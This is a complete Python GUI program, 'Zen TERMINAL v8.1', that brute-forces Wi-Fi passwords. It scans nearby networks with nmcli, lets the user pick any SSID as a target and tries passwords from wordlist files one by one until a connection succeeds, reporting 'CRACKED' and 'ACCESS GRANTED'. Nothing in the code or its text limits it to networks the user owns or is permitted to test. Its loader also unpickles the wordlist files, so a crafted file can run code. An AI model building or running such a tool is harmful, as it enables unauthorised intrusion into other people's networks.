#!/usr/bin/env python3
"""
Zen TERMINAL v8.1 – FINAL EDITION
+ NO WHITE PADDING ANYWHERE
+ Compact GUI
+ Start from selected file
+ Abort → Select → Attack = Skip
"""
import os
import sys
import time
import shutil
import subprocess
import threading
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
from pathlib import Path
from typing import List, Callable
import numpy as np

# ==============================================================
# CONFIG
# ==============================================================
SCAN_TIMEOUT = 15
CONNECT_TIMEOUT = 12
INTER_TRY_DELAY = 0.5

PASSWORD_FOLDER: Path | None = None

# --------------------- Helpers ---------------------
def run(cmd: List[str], timeout: int = 15) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)

# --------------------- nmcli ---------------------
def ensure_nmcli(logger: Callable[[str], None]) -> bool:
    if shutil.which("nmcli"): return True
    logger("[ERROR] `nmcli` not found in PATH.")
    logger(" • Install NetworkManager:")
    logger("   Arch:   sudo pacman -S networkmanager")
    logger("   Ubuntu: sudo apt-get install network-manager")
    logger(" • Then: sudo systemctl enable --now NetworkManager")
    return False

def scan_ssids(logger: Callable[[str], None]) -> List[str]:
    logger("[INFO] Scanning networks...")
    proc = run(["nmcli", "-t", "-f", "SSID", "dev", "wifi", "list"], timeout=SCAN_TIMEOUT)
    if proc.returncode != 0:
        logger(f"[ERROR] nmcli failed: {proc.stderr.strip()}")
        return []
    return [s.strip() for s in proc.stdout.splitlines() if s.strip()]

def create_base_profile(ssid: str) -> bool:
    run(["nmcli", "con", "delete", ssid], timeout=10)
    cmd = [
        "nmcli", "con", "add", "type", "wifi", "con-name", ssid, "ssid", ssid,
        "wifi-sec.key-mgmt", "wpa-psk",
        "connection.autoconnect", "no", "connection.permissions", ""
    ]
    return run(cmd).returncode == 0

def try_password_fast(ssid: str, password: str) -> bool:
    if run(["nmcli", "con", "mod", ssid, "wifi-sec.psk", password]).returncode != 0:
        return False
    if run(["nmcli", "con", "up", ssid], timeout=CONNECT_TIMEOUT).returncode != 0:
        return False
    status = run(["nmcli", "-t", "-f", "DEVICE,STATE,CONNECTION", "device", "status"])
    for line in status.stdout.splitlines():
        parts = line.split(':')
        if len(parts) >= 3 and parts[1] == "connected" and parts[2] == ssid:
            return True
    return False

# --------------------- Password Files ---------------------
def load_password_files(logger: Callable[[str], None]) -> List[Path]:
    global PASSWORD_FOLDER
    if not PASSWORD_FOLDER or not PASSWORD_FOLDER.is_dir():
        logger("[ERROR] No folder selected.")
        return []

    files = []
    if (PASSWORD_FOLDER / "password.npy").is_file():
        files.append(PASSWORD_FOLDER / "password.npy")
    for f in sorted(PASSWORD_FOLDER.glob("password[0-9]*.npy")):
        files.append(f)

    if not files:
        logger(f"[ERROR] No password*.npy files in:\n    {PASSWORD_FOLDER}")
    else:
        logger(f"[INFO] Found {len(files)} file(s):")
        for f in files:
            logger(f" • {f.name}")
    return files

def load_passwords_from_npy(filepath: Path) -> List[str]:
    try:
        arr = np.load(filepath, allow_pickle=True)
        return [str(p).strip() for p in arr.flatten() if str(p).strip()]
    except Exception as e:
        print(f"[ERROR] Failed to load {filepath.name}: {e}")
        return []

# --------------------- GUI ---------------------
class ZenApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Zen TERMINAL v8.1")
        self.configure(bg="#000000")

        # === STYLES ===
        style = ttk.Style(self)
        style.theme_use('clam')
        style.configure("Zen.TFrame", background="#000000")
        style.configure("Zen.TLabel", background="#000000", foreground="#00ff41", font=("Courier", 9))
        style.configure("Zen.Title.TLabel", background="#000000", foreground="#00ff41", font=("Courier", 14, "bold"))
        style.configure("Zen.Console.TScrolledText", background="#0a0a0a", foreground="#00ff41", font=("Courier", 9))
        style.map("Zen.TButton", background=[('active', '#002200')], foreground=[('active', '#00ff41')])
        style.configure("Zen.TButton", background="#001100", foreground="#00ff41", font=("Courier", 10, "bold"), borderwidth=1, relief="flat", padding=6)
        style.layout("Zen.TProgressbar", [
            ('Zen.TProgressbar.trough', {'children': [(
                'Zen.TProgressbar.pbar', {'side': 'left', 'sticky': 'nswe'}
            )], 'sticky': 'nswe'})
        ])
        style.configure("Zen.TProgressbar", background="#00ff41", troughcolor="#001100")

        # === COMBOBOX: REMOVE WHITE PADDING & BG ===
        style.configure("Zen.TCombobox",
                        fieldbackground="#001100",
                        background="#001100",
                        foreground="#00ff41",
                        arrowcolor="#00ff41",
                        borderwidth=1,
                        relief="flat")
        style.map("Zen.TCombobox",
                  fieldbackground=[('readonly', '#001100')],
                  selectbackground=[('readonly', '#002200')],
                  selectforeground=[('readonly', '#00ff41')])

        # === MAIN FRAME ===
        self.main_frame = ttk.Frame(self, style="Zen.TFrame", padding=12)
        self.main_frame.pack(fill="both", expand=True)

        # === HEADER ===
        ascii_art = r"""
 ______                ______ _             _____  __  
|___  /                |  ___(_)           |  _  |/  | 
   / /  ___ _ __ ______| |_   _      __   _| |/' |`| | 
  / /  / _ \ '_ \______|  _| | |     \ \ / /  /| | | | 
./ /__|  __/ | | |     | |   | |  _   \ V /\ |_/ /_| |_
\_____/\___|_| |_|     \_|   |_| (_)   \_/  \___/ \___/
                                                       
                                                       
                 NEXT-GEN BRUTE-FORCE CORE
        """
        header = ttk.Label(self.main_frame, text=ascii_art, style="Zen.Title.TLabel", justify="center")
        header.pack(pady=(0, 10))

        # === FOLDER + SSID ROW ===
        top_frame = ttk.Frame(self.main_frame, style="Zen.TFrame")
        top_frame.pack(fill="x", pady=4)

        # Folder
        ttk.Label(top_frame, text="DIR:", style="Zen.TLabel").pack(side="left")
        self.folder_var = tk.StringVar(value="Select folder...")
        self.folder_entry = ttk.Entry(top_frame, textvariable=self.folder_var, state="readonly", width=45, font=("Courier", 9))
        self.folder_entry.pack(side="left", padx=4, fill="x", expand=True)
        ttk.Button(top_frame, text="BROWSE", command=self.select_folder, style="Zen.TButton").pack(side="left", padx=4)

        # SSID
        ssid_frame = ttk.Frame(self.main_frame, style="Zen.TFrame")
        ssid_frame.pack(fill="x", pady=4)
        ttk.Label(ssid_frame, text="SSID:", style="Zen.TLabel").pack(side="left")
        self.ssid_var = tk.StringVar()
        self.ssid_combo = ttk.Combobox(ssid_frame, textvariable=self.ssid_var, state="readonly", width=45, font=("Courier", 9))
        self.ssid_combo.pack(side="left", padx=4, fill="x", expand=True)
        ttk.Button(ssid_frame, text="SCAN", command=self.refresh_ssids, style="Zen.TButton").pack(side="right")

        # === CONSOLE (SMALL HEIGHT) ===
        self.console = scrolledtext.ScrolledText(
            self.main_frame,
            height=8,
            bg="#0a0a0a", fg="#00ff41", font=("Courier", 9),
            insertbackground="#00ff41", relief="flat", state="disabled", wrap="word"
        )
        self.console.pack(fill="both", expand=True, pady=8)

        # === STATUS + PROGRESS ===
        status_frame = ttk.Frame(self.main_frame, style="Zen.TFrame")
        status_frame.pack(fill="x", pady=4)
        self.status_label = ttk.Label(status_frame, text="READY", style="Zen.TLabel", font=("Courier", 11, "bold"))
        self.status_label.pack(side="left")
        self.progress = ttk.Progressbar(status_frame, mode="determinate", style="Zen.TProgressbar")
        self.progress.pack(side="left", fill="x", expand=True, padx=8)
        self.prog_label = ttk.Label(status_frame, text="0 / 0", style="Zen.TLabel")
        self.prog_label.pack(side="right")

        # === CONTROL BAR (FIXED: NO WHITE PADDING) ===
        control_frame = ttk.Frame(self.main_frame, style="Zen.TFrame")
        control_frame.pack(fill="x", pady=(10, 0), padx=15)

        # === LEFT: File Selector ===
        file_frame = ttk.Frame(control_frame, style="Zen.TFrame")
        file_frame.pack(side="left", anchor="w")

        ttk.Label(file_frame, text="START FROM:", style="Zen.TLabel").pack(side="left", padx=(0, 5))
        self.file_var = tk.StringVar()
        self.file_combo = ttk.Combobox(
            file_frame, textvariable=self.file_var, state="readonly",
            width=28, font=("Courier", 9), style="Zen.TCombobox"
        )
        self.file_combo.pack(side="left")

        # === RIGHT: Buttons ===
        btn_frame = ttk.Frame(control_frame, style="Zen.TFrame")
        btn_frame.pack(side="right", anchor="e")

        self.stop_btn = ttk.Button(
            btn_frame, text="ABORT", command=self.stop_brute,
            state="disabled", style="Zen.TButton"
        )
        self.stop_btn.pack(side="right", padx=(0, 5))

        self.start_btn = ttk.Button(
            btn_frame, text="INITIATE ATTACK", command=self.start_brute,
            style="Zen.TButton"
        )
        self.start_btn.pack(side="right")

        # === AUTO-SIZE ===
        self.update_idletasks()
        width = max(self.winfo_reqwidth(), 650)
        height = max(self.winfo_reqheight(), 480)
        self.geometry(f"{width}x{height}")
        self.minsize(650, 180)

        # === STATE ===
        self.running = False
        self.stop_event = threading.Event()
        self.password_files: List[Path] = []
        self.total_pw = 0
        self.tried_pw = 0
        self.target_ssid = ""
        self.blink_active = False

        # Init
        self.check_root()
        self.refresh_ssids()

    # ------------------------------------------------------------------
    def log(self, msg: str):
        self.console.configure(state="normal")
        self.console.insert(tk.END, msg + "\n")
        self.console.see(tk.END)
        self.console.configure(state="disabled")
        self.update_idletasks()

    def check_root(self):
        if os.geteuid() != 0:
            self.log("[ERROR] ROOT REQUIRED")
            messagebox.showerror("ACCESS DENIED", "Run with sudo!")
            self.start_btn.configure(state="disabled")

    def select_folder(self):
        global PASSWORD_FOLDER
        folder = filedialog.askdirectory(title="Select Password Folder", initialdir="/home")
        if folder:
            PASSWORD_FOLDER = Path(folder)
            self.folder_var.set(str(PASSWORD_FOLDER))
            self.log(f"[FOLDER] {PASSWORD_FOLDER}")
            self.update_file_selector()
        else:
            self.log("[FOLDER] Cancelled.")

    def update_file_selector(self):
        self.password_files = load_password_files(self.log)
        file_names = [f.name for f in self.password_files]
        self.file_combo["values"] = file_names
        if file_names:
            self.file_combo.current(0)
            self.file_var.set(file_names[0])
        else:
            self.file_combo["values"] = []
            self.file_var.set("")

    def refresh_ssids(self):
        self.ssid_combo["values"] = []
        self.ssid_var.set("")
        self.log("[SCAN] Probing...")
        ssids = scan_ssids(self.log)
        if ssids:
            self.ssid_combo["values"] = ssids
            self.ssid_combo.current(0)
            self.log(f"[OK] {len(ssids)} networks.")
        else:
            self.log("[WARNING] No networks.")

    # ------------------------------------------------------------------
    def start_brute(self):
        if self.running:
            self.log("[INFO] Already running. Use ABORT first.")
            return

        self.target_ssid = self.ssid_var.get().strip()
        if not self.target_ssid:
            messagebox.showwarning("NO TARGET", "Select SSID.")
            return

        if not self.password_files:
            self.update_file_selector()
            if not self.password_files:
                messagebox.showerror("NO FILES", "Select folder with password*.npy")
                return

        selected_idx = self.file_combo.current()
        if selected_idx == -1:
            messagebox.showwarning("NO FILE", "Select a file to start from.")
            return

        self.selected_file_idx = selected_idx
        self.total_pw = sum(len(load_passwords_from_npy(p)) for p in self.password_files[selected_idx:])
        if self.total_pw == 0:
            messagebox.showerror("EMPTY", "Selected files have no passwords.")
            return

        self.tried_pw = 0
        self.progress["maximum"] = self.total_pw
        self.progress["value"] = 0
        self.prog_label.configure(text=f"0 / {self.total_pw}")
        self.status_label.configure(text="BREACHING...")
        self.running = True
        self.stop_event.clear()
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        threading.Thread(target=self.bruteforce_worker, daemon=True).start()

    def stop_brute(self):
        if self.running:
            self.stop_event.set()
            self.log("[ABORT] Stopping attack...")

    # ------------------------------------------------------------------
    def bruteforce_worker(self):
        self.log(f"\n[TARGET] {self.target_ssid}")
        if not create_base_profile(self.target_ssid):
            self.log("[FATAL] Failed to create profile.")
            self.finish(False)
            return

        start_time = time.time()
        success = False

        for file_idx in range(self.selected_file_idx, len(self.password_files)):
            if self.stop_event.is_set(): break
            filepath = self.password_files[file_idx]
            self.file_combo.current(file_idx)
            self.log(f"\n[LOAD] {filepath.name} [{file_idx+1}/{len(self.password_files)}]")

            passwords = load_passwords_from_npy(filepath)
            if not passwords:
                self.log("[SKIP] Empty file.")
                continue

            for pw in passwords:
                if self.stop_event.is_set(): break
                self.tried_pw += 1
                self.progress["value"] = self.tried_pw
                self.prog_label.configure(text=f"{self.tried_pw} / {self.total_pw}")
                self.status_label.configure(text=f"TRY: {pw}")
                self.update_idletasks()

                if try_password_fast(self.target_ssid, pw):
                    elapsed = time.time() - start_time
                    self.log(f"\n[CRACKED] {pw}")
                    self.log(f"[TIME] {elapsed:.1f}s | [FILE] {filepath.name}")
                    self.status_label.configure(text="ACCESS GRANTED")
                    self.start_blink()
                    success = True
                    break
                else:
                    self.log(f"[{self.tried_pw:5}] {pw:<15} -> DENIED")
                    time.sleep(INTER_TRY_DELAY)

            if success or self.stop_event.is_set(): break

        self.finish(success)

    def start_blink(self):
        if self.blink_active: return
        self.blink_active = True
        def blink():
            if not self.blink_active: return
            color = "#ff0000" if self.status_label.cget("foreground") == "#00ff41" else "#00ff41"
            self.status_label.configure(foreground=color)
            self.after(400, blink)
        blink()

    def finish(self, success: bool):
        run(["nmcli", "con", "delete", self.target_ssid])
        self.running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.blink_active = False
        if success:
            messagebox.showinfo("SUCCESS", "Password in console!")
        else:
            if not self.stop_event.is_set():
                self.log("\n[FAILED] No key found.")
                self.status_label.configure(text="LOCKED")
                messagebox.showwarning("FAILED", "Target secure.")

# ----------------------------------------------------------------------
def main():
    app = ZenApp()
    if not ensure_nmcli(app.log):
        sys.exit(1)
    app.mainloop()

if __name__ == "__main__":
    main()